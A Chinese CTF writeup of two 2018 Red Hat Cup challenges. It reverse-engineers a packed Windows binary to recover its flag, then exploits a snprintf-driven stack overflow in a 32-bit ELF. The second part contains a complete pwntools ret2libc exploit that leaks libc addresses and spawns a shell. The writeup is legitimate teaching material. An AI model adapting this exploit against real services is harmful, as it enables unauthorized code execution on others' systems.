---
title: 2018 红帽杯线上赛一道 RE + 一道 Pwn 解题报告（writeup）
date: 2018-05-06 17:20:29
tags:
- 信息安全
- CTF
- Writeup
---

### 0x0. 前言

这次红帽杯除送分题外唯一做出的题就是一道逆向（还有一道 Pwn 差了一点，比赛结束后才做出来），我好菜啊。不过组队打 CTF 还是开心，嘻嘻。

比赛文件下载：[RE - CCM](https://github.com/hx1997/CTF-writeups/blob/master/2018-redhat-online-re-ccm-writeup/CCM.exe?raw=true)、[Pwn2](https://github.com/hx1997/CTF-writeups/blob/master/2018-redhat-online-re-ccm-writeup/pwn2?raw=true)

### 0x1. RE - CCM

拿到 exe，扔进 PEiD 看看。

![](//wx2.sinaimg.cn/large/6b1e58d5gy1fr1rnm3p3bj20ei089gmh.jpg)

加了 nSPack 壳，先找个工具脱壳。脱壳后的文件拖进 IDA，按 F5 看伪代码。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax@1
  int result; // eax@5
  char v5; // [sp+1h] [bp-55h]@2
  char Buf; // [sp+2h] [bp-54h]@1
  char Dst; // [sp+3h] [bp-53h]@1
  char v8; // [sp+2Ch] [bp-2Ah]@1
  char v9; // [sp+2Dh] [bp-29h]@2

  Buf = 0;
  memset(&Dst, 0, 79u);
  puts("Input Flag");
  v3 = _iob_func();
  fgets(&Buf, 44, v3);
  if ( v8 != 10 || (v9 = 0, *(&v5 + strlen(&Buf)) = 0, strlen(&Buf) != 42) )
  {
    result = -1;
  }
  else
  {
    if ( sub_401380((int)&Buf, 42) == 1 )
      printf("Right!\n");
    result = 0;
  }
  return result;
}
```

`main` 函数逻辑很简单，就是确认输入的 flag 长度为 42，再经过函数 `sub_401380` 处理，如果返回 1 就打印 `Right!`，表示输入的 flag 正确。

进入 `sub_401380` 分析。

![](//wx3.sinaimg.cn/large/6b1e58d5gy1fr1uhawb0nj20n614wt9j.jpg)

看不全的两行后面再说。

这里一上来是一个反调试，总共三句 `GetTickCount()`，因为只会影响到动态调试，不会影响静态分析，所以不用管。

比较重要的是几个函数调用，以及标签 `LABEL_15` 后的代码。先看第 33 行调用的 `sub_401320`。

```c
if ( sub_401320(v3, v2) != 1 )
    return -1;
```

```c
signed int __fastcall sub_401320(int a1, int a2)
{
  int v2; // esi@1

  v2 = 0;
  while ( byte_4021B4[v2] == ((unsigned __int8)*(&byte_4021B4[a1 - (signed int)byte_4021B4] + v2) ^ 0x99) )
  {
    if ( ++v2 >= 5 )
    {
      if ( *(_BYTE *)(a1 + a2 - 1) == '}'
        && *(_BYTE *)(a1 + 13) == '-'
        && *(_BYTE *)(a1 + 18) == '-'
        && *(_BYTE *)(a1 + 23) == '-'
        && *(_BYTE *)(a1 + 28) == '-' )
      {
        return 1;
      }
      return -1;
    }
  }
  return -1;
}
```

这个函数作用是以 `0x99` 为异或密钥检验输入 flag 的前五位是否为 `flag{`，并直接比对第 14、19、24、29 位是否为 `-`，以及最后一位是否为 `}`。换句话说，输入的 flag 格式必须是 `flag{????????-????-????-????-????????????}`，其中 `?` 是待确定字符。

回到上一个函数，按程序流程走到第 35 行，进入 `sub_401280` 分析。

```c
int sub_401280()
{
  signed int v0; // esi@1
  int v1; // eax@2
  int result; // eax@2
  signed __int64 v3; // rtt@2

  srand(0x556AAF49u);
  v0 = 0;
  do
  {
    v1 = rand();
    v3 = v1;
    result = v1 / 26;
    byte_403370[v0++] = (unsigned __int64)(v3 % 26) + 'a';
  }
  while ( v0 < 84 );
  return result;
}
```

这个函数作用是用随机数种子 `0x556AAF49` 生成 84 个伪随机数，每个数模 26 映射到 a-z 26 个小写字母，再存到全局数组 `byte_403370` 中，作为后面加密替换的密码表之一。因为随机数种子固定，所以生成的伪随机数和密码表也是固定的，密码表为：

```
sxcunsbjptdunaaxklcvxsikxiewcmpwdngfqtfvomgkbwjrmccntqlratukzoafmngbyykjtabnhrnmweln
```

回到上一个函数继续走，动态分配了两个数组，并在第 41 行将其中一个数组 `flag_hex_ary` 作为参数传入 `sub_4012C0`，跟进去分析。

```c
flag_hex_ary = malloc(0x100u);
new_pass_table = malloc(0x100u);
memset(flag_hex_ary, 0, 0x100u);
memset(new_pass_table, 0, 0x100u);
v7 = v17;
sub_4012C0((int)flag_hex_ary, v16, v17);
```

```c
void __usercall sub_4012C0(int a1@<edx>, int a2@<ecx>, int a3)
{
  int v3; // esi@1
  int i; // ebx@1
  unsigned int v5; // ecx@2
  unsigned int v6; // eax@2
  char v7; // cl@3
  char v8; // al@6

  v3 = 0;
  for ( i = a2; v3 < a3; ++v3 )
  {
    v5 = (unsigned int)*(_BYTE *)(v3 + i) >> 4;
    v6 = *(_BYTE *)(v3 + i) % 16;
    if ( v5 > 9 )
      v7 = v5 + 'W';
    else
      v7 = v5 + '0';
    if ( v6 > 9 )
      v8 = v6 + 'W';
    else
      v8 = v6 + '0';
    *(_BYTE *)(a1 + 2 * v3) = v7;
    *(_BYTE *)(a1 + 2 * v3 + 1) = v8;
  }
}
```

简单来说，这个函数作用是把输入的 flag 转换成十六进制字符串，例如字符串 abc 会转换成字符串 616263（61、62、63 是 a、b、c 三个字符的十六进制 ASCII 码）。转换后的字符串（严格来说没有结束符）存到传进来的数组中。注意，转换后的字符串长度是原来的两倍，即 42\*2=84 字节；而且转换后字符串中字母全小写。

回到上一个函数继续走，第 48 行以两个局部数组为参数调用了 `sub_401000`，进入分析。

```c
sub_401000(&subst_table_up, &subst_table_low);
```

```c
  v4 = 0;
  do
  {
    v5 = 0;
    do
    {
      if ( v4 )
      {
        if ( v5 )
        {
          v6 = (v5 + v4 - 2) % 26 + 'a';
          v7 = v5 + 27 * v4;
        }
        else
        {
          v6 = v4 + '`';
          v7 = 27 * v4;
        }
      }
      else
      {
        if ( !v5 )
        {
          *v9 = 32;
          goto LABEL_22;
        }
        v6 = v5 + '`';
        v7 = v5;
      }
      v9[v7] = v6;
LABEL_22:
      ++v5;
    }
    while ( v5 < 27 );
    ++v4;
  }
```

这个函数有两部分，功能一样，只是一个针对小写字母，一个针对大写字母，这里只截取了小写字母部分，后面的分析将会表明大写字母的部分是没用的。

这个函数的作用是生成两张维吉尼亚密码表，一张小写，一张大写，长这样（要用到的是小写的）：

![](//wx4.sinaimg.cn/mw690/6b1e58d5gy1fr1w8qokr2j20p00p0grz.jpg)

小写密码表会存到传入的局部数组 `subst_table_low`，以备后面加密替换。

回到上一个函数继续走，第 49 行调用了 `sub_401170`，参数是转换过的十六进制字符串、两张维吉尼亚密码表、一个空数组，进入分析。

```c
sub_401170((int)new_pass_table, (const char *)flag_hex_ary, v8, (int)&subst_table_up, (int)&subst_table_low);
```

```c
v18 = 0;
if ( flag_hex_ary_len > 0 )
      {
        v17 = flag_hex_ary_len;
        v10 = new_pass_table - (_DWORD)hex_ary_idx;
        do
        {
          cur_ary_char = *hex_ary_idx;
          if ( (*hex_ary_idx < 'A' || cur_ary_char > 'Z') && (cur_ary_char < 'a' || cur_ary_char > 'z') )
          {
            v7 = v18;
            v9 = 84;                           // set v9 to 84
            v12 = *(&byte_402144[4 * (unsigned __int8)(((unsigned __int8)cur_ary_char - '0') / 4)]
                  + (unsigned __int8)(((unsigned __int8)cur_ary_char - '0') % 4));// hex_ary中数字转换成GHIJKLMNO
          }
          else
          {
            v12 = sub_4010E0(byte_403370[v7 % v9], cur_ary_char, subst_table_up, subst_table_low);// hex_ary中字母换成密码表中对应项：cur_ary_char所在列，byte_403370[v7 % v9]所在行交叉处的字符
            v7 = v18++ + 1;                     // 只在遇到字母时加一
          }
          (hex_ary_idx++)[v10] = v12;           // 加密后的字符存到new_pass_table
          --v17;
        }
        while ( v17 );                          // 遍历hex_ary
```

只截取了重要部分代码。这个函数对传进来的十六进制字符串加密，根据每个字符是数字还是字母分别处理：数字 0123456789 分别转换成 GHIJKLMNOP，字母则调用函数 `sub_4010E0` 决定要替换成什么字符。加密后的字符串存到 `new_pass_table`。限于篇幅，这里就不展开了，字母替换的规则简单来说就是在小写维吉尼亚密码表（由于前面生成十六进制字符串的算法中只会生成小写字母，所以大写维吉尼亚密码表其实没用到）第一行找到待替换字符所在列，再在第一列找到 `byte_403370[v7 % v9]` 这个字符所在行，行列交叉处的字符就是要替换成的字符。

回到上一个函数，按流程走到第 72 行：

```c
  v18 = 2 * 42;
  v11 = 2 * 42;
  v12 = 204;
  v13 = 7;
  while ( v12 - 204 == v13 )
  {
    v13 += 16;
LABEL_15:
    if ( ++v12 - 204 >= v11 )
    {
      v10 = free;
      goto LABEL_17;
    }
  }
  if ( *((_BYTE *)&dword_402160[-51] + v12) == (v12 % 256 ^ *((char *)new_pass_table + v12 - 204)) )
  {
    v11 = v18;
    goto LABEL_15;
  }
  free(new_pass_table);
  return -1;
```

一开始 `while` 循环不会执行，先看到很长的那句，作用是比对全局数组 `dword_402160` 中的每个字节和 `v12 % 256` 与 `new_pass_table` 中每个字节的异或是否相等，不相等就返回 -1，全部相等就跳到标签 `LABEL_17`。我们的目的是使程序最后打印出 `Right!`，从而确定正确的 flag，所以要求 `if` 语句必须满足，即二者必须相等。

注意到异或运算的一个性质：如果 A ^ B = C，那么 A ^ C = B。现在已知 `dword_402160` 数组的内容和 `v12 % 256` 的值，可以反推出输入正确的 flag 时，`new_pass_table` 中应该有的内容。再结合前面分析的加密算法，可以从 `new_pass_table` 再解密还原出正确的 flag。

写了一段 C 代码，得到正确 flag 对应的 `new_pass_table` 内容是（都是十六进制数）：

> 4d 4d 4d 75 4d 48 4d d3 4e 79 4a 4c 4a 4b 4d 4d 4a 50 4a 4b 4a 4d 4d e3 4a 4c 49 66 4d 4d 4a 50 4a 4c 4d 48 49 78 4a f3 4d 48 4a 47 4d 48 49 71 4d 49 4d 48 4a 4a 4a 03 49 76 4a 4e 4d 49 4a 48 4a 4e 4a 48 4d 48 4a 13 4d 4c 4d 4a 4d 48 4a 4f 4a 49 4e 65

看成 ASCII 码转成字符是：

> MMMuMHM?NyJLJKMMJPJKJMM?JLIfMMJPJLMHIxJ?MHJGMHIqMIMHJJJ?IvJNMIJHJNJHMHJ?MLMJMHJOJINe

其中问号是不可显示字符，是题目故意设置的障碍，要在标签 `LABEL_17` 中才能解出。先不管问号，把已知的部分按刚才分析的加密算法反过来做，大写字母还原回数字，小写字母还原回字母，就能得到：

> 66 6c 61 6? 7b 35 34 66 39 34 36 6? 35 2d 66 39 35 61 2d 3? 61 30 61 2d 62 61 33 3? 2d 37 62 31 37 31 61 3? 65 63 61 38 32 7d

看成 ASCII 码转成字符是：

> fla?{54f946?5-f95a-?a0a-ba3?-7b171a?eca82}

由于已知 flag 前四位，第四位问号可以补出。剩下四位未知字符需要在标签 `LABEL_17` 中确定，据说是一个 CRC32 算法。但因为只有四位字符，运算量不大，我就直接爆破了。
$$
flag\{54f946f5-f95a-4a0a-ba31-7b171a7eca82\}
$$
![](//wx3.sinaimg.cn/large/6b1e58d5gy1fr1yn8s2qtj20d306l74g.jpg)

### 0x2. Pwn - game server

一道简单的栈溢出。拿到文件先扔进 file 命令，看到是 32 位 ELF，再检查保护机制，只开启了 NX 和 Partial RELRO。扔进 IDA，`main` 函数除了调用 `sub_8048637` 外，没有任何有趣的地方。进入 `sub_8048637`：

```c
int sub_8048637()
{
  char s; // [sp+7h] [bp-111h]@5
  char v2; // [sp+107h] [bp-11h]@5
  size_t nbytes; // [sp+108h] [bp-10h]@5
  char *v4; // [sp+10Ch] [bp-Ch]@1

  puts("Welcome to my game server");
  puts("First, you need to tell me you name?");
  fgets(byte_804A180, 256, stdin);
  v4 = strrchr(byte_804A180, 10);
  if ( v4 )
    *v4 = 0;
  printf("Hello %s\n", byte_804A180);
  puts("What's you occupation?");
  fgets(byte_804A080, 256, stdin);
  v4 = strrchr(byte_804A080, 10);
  if ( v4 )
    *v4 = 0;
  printf("Well, my noble %s\n", byte_804A080);
  nbytes = snprintf(
             &s,
             0x100u,
             "Our %s is a noble %s. He is come from north and well change out would.",
             byte_804A180,
             byte_804A080);
  puts("Here is you introduce");
  puts(&s);
  puts("Do you want to edit you introduce by yourself?[Y/N]");
  v2 = getchar();
  getchar();
  if ( v2 == 89 )
    read(0, &s, nbytes);
  return printf("name : %s\noccupation : %s\nintroduce : %s\n", byte_804A180, byte_804A080, &s);
}
```

注意到倒数第三行的 `read` 第三个参数（读入的长度）是变量，而这个变量的值又由上面的 `snprintf` 的返回值决定。查手册得知 `snprintf` 的返回值是“假设第二个参数足够大时将会写入的字符数，不计结束符”（"The number of characters that would have been written if n had been sufficiently large, not counting the terminating *null character*. "）。就是说返回值并不是*实际*写入的字符数，而是*本来应该*写入的字符数。又因为格式字符串的长度受到用户输入的控制，我们可以往缓冲区 `s` 中写入超过其大小的数据，造成栈溢出。只要在输入 name 和 occupation 时各输入 255 字节的数据就能利用漏洞覆盖返回地址，用 GDB 很容易确定溢出点偏移是 277。

接下来问题是返回到哪里，程序本身没有 `system` 函数，也没有 `/bin/sh` 字符串，考虑泄露 libc 中的函数地址。程序里有 `puts`，利用它先泄露一个 `puts` 的地址（返回到 `puts`，把 `puts` 的 GOT 地址放在栈上作为参数传入），再去 libc-database 里查服务器的 libc 版本。查到后就可以计算出 `system` 函数的地址和 `/bin/sh` 字符串的地址。这里需要在泄露 `puts` 地址之后返回到 `main` 函数再次触发栈溢出，这次才返回到 `system`（因为第一次的时候还不知道 `system` 的地址，泄露完之后才能计算出）。Exp 如下：

```python
from pwn import *

context.log_level='debug'
p = process('./pwn2')
#p = remote('123.59.138.180','20000')
elf = ELF('./pwn2')
libc = ELF('./libc.so')

puts_plt = elf.plt['puts']
read_plt = elf.plt['read']
puts_got = elf.got['puts']

print "puts_plt: "+hex(puts_plt)
print "read_plt: "+hex(read_plt)
print "puts_got: "+hex(puts_got)

main_add = 0x080485cb
poc = 'A'*277+p32(puts_plt)+p32(main_add)+p32(puts_got)

def pwning(i):
	p.recvuntil('name?')
	p.sendline('A'*255)
	p.recvuntil('N]')
	p.sendline('Y')
	p.send(poc)
	p.recvuntil('duce : ')
	if(i==1):
		p.recvn(277+13)
	else:
		p.recvn(277)

pwning(1)
puts_addr = u32(p.recv(4))
print 'puts_add: ' + hex(puts_addr)

libc = ELF('./libc.so')
binsh = next(libc.search('/bin/sh'))
sys_off = libc.symbols['system']
puts_off = libc.symbols['puts']
off = sys_off - puts_off
off2 = binsh - puts_off

print 'sys_off: ' + hex(sys_off)
print 'puts_off: ' + hex(puts_off)
print 'off: ' + hex(puts_addr+off)
print 'binsh: ' + p32(binsh).ljust(4,'\x00')

poc = 'A'*277+p32(puts_addr+off)+'AAAA'+p32(puts_addr+off2)
pwning(2)

p.interactive()
```

最后 flag：
$$
flag\{f3b92d795c9ee0725c160680acd084d9\}
$$


![](//wx3.sinaimg.cn/mw690/6b1e58d5gy1fs3393pkfbj20u012345g.jpg)

